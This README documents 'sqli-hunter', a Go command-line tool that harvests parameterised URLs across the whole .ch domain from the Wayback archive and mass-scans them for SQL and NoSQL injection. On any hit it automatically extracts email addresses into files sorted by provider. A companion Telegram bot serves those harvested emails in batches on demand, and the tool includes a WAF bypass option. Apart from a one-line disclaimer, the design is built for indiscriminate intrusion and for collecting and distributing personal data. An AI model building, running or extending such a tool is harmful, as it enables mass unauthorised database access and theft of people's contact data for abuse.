# sqli-hunter

Scanner CLI en **Go** dédié aux **injections donnant accès à la base de données**.

## Cible : accès DB uniquement

| Type | Objectif |
|------|----------|
| **SQLi error-based** | Erreurs SQL → requêtes injectables |
| **SQLi union-based** | Extraction `version()`, `database()`, `information_schema` |
| **SQLi boolean-blind** | Manipulation de requêtes SELECT |
| **SQLi time-blind** | Exécution de requêtes temporisées (`--full`) |
| **NoSQL injection** | Bypass auth MongoDB, accès collections |

Payloads orientés **extraction de métadonnées DB** : version, schémas, tables, utilisateurs.

## Listes d'URLs (bulk)

```bash
# Fichier urls.txt — une URL par ligne, paramètres dans la query
# https://target.com/page?id=1
# https://api.example.com/users?uid=42

./sqli-hunter -l urls.txt --url-threads 8 -o results.json
```

| Option | Description | Défaut |
|--------|-------------|--------|
| `-l, --list` | Fichier d'URLs | — |
| `-o, --output` | Répertoire de sortie | `results` |
| `--url-threads` | URLs scannées en parallèle | 4 |
| `--threads` | Workers scan par URL | 8 |
| `--extract-threads` | Workers extraction | 2 |

En mode liste : progression `[42/1240]`, vulns affichées immédiatement, résumé final compact.

## Extraction de données

Dès qu'une vulnérabilité est détectée, l'outil lance automatiquement l'extraction sur des **workers dédiés** (séparés des threads de scan). Le scan continue en parallèle sans bloquer.

| Option | Description | Défaut |
|--------|-------------|--------|
| `--threads` | Goroutines de scan | 8 |
| `--extract-threads` | Workers d'extraction | 2 |

### Données extraites (mode email — profil **Suisse**)

L'extraction ne récupère que les **emails valides** :

| Champ | Colonnes détectées | Validation |
|-------|-------------------|------------|
| Email | `email`, `mail`, `e_mail`… | regex stricte + blocklist |

Exemple de sortie (`results/emails/bluewin.ch.txt`) :

```
hans.meier@bluewin.ch
marie.mueller@bluewin.ch
```

**Emails par fournisseur** — un fichier `.txt` par domaine email (`gmail.com.txt`, `bluewin.ch.txt`…), une adresse par ligne dans `results/emails/`.

```bash
sqli-hunter css.ch --url-threads 64
```

### Données extraites (--extract-meta)

- Version DB (`@@version`, `version()`)
- Nom de la base (`database()`, `current_database()`)
- Utilisateur DB (`user()`, `system_user`)
- Tables (`information_schema`, `sqlite_master`)
- Dump NoSQL (collections MongoDB)

## Découverte d'URLs (`discover`)

Collecte automatique via **Wayback** — URLs **.ch** avec paramètres (`?key=val`), puis scan des vulnérabilités.

```bash
# Tout le .ch (Wayback)
sqli-hunter ch --discover-limit 1000 --url-threads 64

# Un seul domaine
sqli-hunter css.ch --url-threads 64

# Liste manuelle
sqli-hunter -l scope_ch.txt --url-threads 64
```

| Option | Description |
|--------|-------------|
| `-d, --domain` / `-D` | `ch` = tout le .ch · `css` = css.ch |
| `--paths` | Filtre manuel path (optionnel) |
| `--params` | Filtre manuel paramètres (optionnel) |
| `--no-filter` | Toutes URLs .ch avec `?param=` |
| `--subs` / `--no-subs` | Sous-domaines [défaut: oui] |
| `-o` | Fichier sortie [défaut: `scope_DOMAIN.ch.txt`] |
| `--scan` | Lance le scan après collecte |

Source : API CDX Wayback (`web.archive.org`). Ne fonctionne que sur des domaines **déjà archivés**.

## Scan massif (1k – 100k URLs)

Le mode `-l` utilise le **streaming** : les URLs ne sont pas chargées en mémoire.

```bash
# 50 000 URLs — auto mass si ≥ 500 URLs
sqli-hunter -l scope.txt --url-threads 64

# 100k URLs — progression tous les 500
sqli-hunter -l big_scope.txt --mass --url-threads 64 --progress-every 500
```

| Paramètre | Défaut | Mass auto (≥500 URLs) |
|-----------|--------|------------------------|
| `--url-threads` | 4 | **32** (64 si ≥10k) |
| `--progress-every` | 100 | 100 |
| Mémoire | streaming | écriture disque au fil de l'eau |

- Résultats écrits **immédiatement** dans `results/emails/` (un fichier par fournisseur)
- Affichage compact : progression + vulns uniquement
- Pool HTTP optimisé (500 connexions idle)

## Sortie des résultats

Seuls les **emails** sont écrits sur disque, un fichier par fournisseur dans `results/emails/` :

```
results/
  emails/
    bluewin.ch.txt
    gmail.com.txt
    icloud.com.txt
```

Une adresse par ligne, sans préfixe ni rapport JSON/SQL par site.

```bash
./sqli-hunter -l urls.txt                    # → results/emails/
./sqli-hunter -u "https://x.com/p?id=1" -o results
```

## Bot Telegram (export emails)

Envoie les emails extraits en fichier `.txt` sur demande.

```bash
# 1. Créer un bot via @BotFather → récupérer le token
export TELEGRAM_BOT_TOKEN="123456:ABC..."

# 2. Lancer le bot (lit results/emails/)
go build -o tg-bot ./cmd/tg-bot
./tg-bot
```

Dans Telegram :

```
/list              → fournisseurs dispo + stock
100 gmail          → fichier gmail.com_100.txt
/get 50 bluewin    → 50 emails bluewin.ch
```

| Variable | Description |
|----------|-------------|
| `TELEGRAM_BOT_TOKEN` | Token BotFather (obligatoire) |
| `RESULTS_DIR` | Dossier résultats [défaut: `results`] |
| `TELEGRAM_ALLOWED_IDS` | IDs Telegram autorisés (ex: `123,456`) |
| `TELEGRAM_MAX_EMAILS` | Max par requête [défaut: `10000`] |

## Installation

```bash
go build -o sqli-hunter ./cmd/sqli-hunter
go build -o tg-bot ./cmd/tg-bot
```

## Usage

```bash
# Scan rapide SQLi + NoSQL
./sqli-hunter -u "https://target.com/page?id=1"

# SQLi uniquement
./sqli-hunter -u "https://target.com/product?id=1" -t sqli

# Union + extraction DB
./sqli-hunter -u "https://target.com/item?id=1" -t union -v

# Scan complet (time-based inclus)
./sqli-hunter -u "https://target.com/api?id=1" --full
```

## Benchmark local — 24 scénarios réalistes

```bash
go run ./cmd/benchmark
go test ./internal/benchmark/... -v
```

### Contextes applicatifs testés

| Contexte | Scénarios | Exemple réel |
|----------|-----------|--------------|
| E-commerce | 3 | testphp.vulnweb.com, fiche produit, recherche |
| Authentification | 3 | DVWA login, Juice Shop MongoDB |
| API REST | 3 | Spring Boot, Node.js JSON, ASP.NET pagination |
| Panel admin | 3 | EXTRACTVALUE, MSSQL search, logs blind |
| Santé | 2 | Oracle patient, SQLite labo |
| Banque | 2 | PostgreSQL relevé, virement blind |
| Blog/CMS | 2 | WordPress slug, UNION database() |
| Legacy PHP | 2 | artists.php, avis POST |
| SaaS B2B | 2 | CRM MSSQL, tenant NoSQL $regex |
| Réservation | 2 | Booking ref, moteur vols PG |
| **Négatifs** | 2 | Page statique, requêtes préparées |

### DBMS couverts

MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MongoDB

### Tests unitaires

```bash
go test ./... -v   # 50+ cas : erreurs SQL par DBMS, boolean blind, UNION, NoSQL, faux positifs
```


```bash
./sqli-hunter -u "http://testphp.vulnweb.com/artists.php?artist=1" -t sqli -v
./sqli-hunter -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -t sqli,union
```

## Options

| Option | Description | Défaut |
|--------|-------------|--------|
| `-t, --test` | `sqli`, `nosql`, `error`, `union`, `boolean`, `time` | sqli + nosql |
| `--full` | Scan complet + time-based | off |
| `--waf` | Bypass WAF SQLi | off |

## Avertissement

Utilisez uniquement sur des cibles autorisées (bug bounty, pentest, lab).
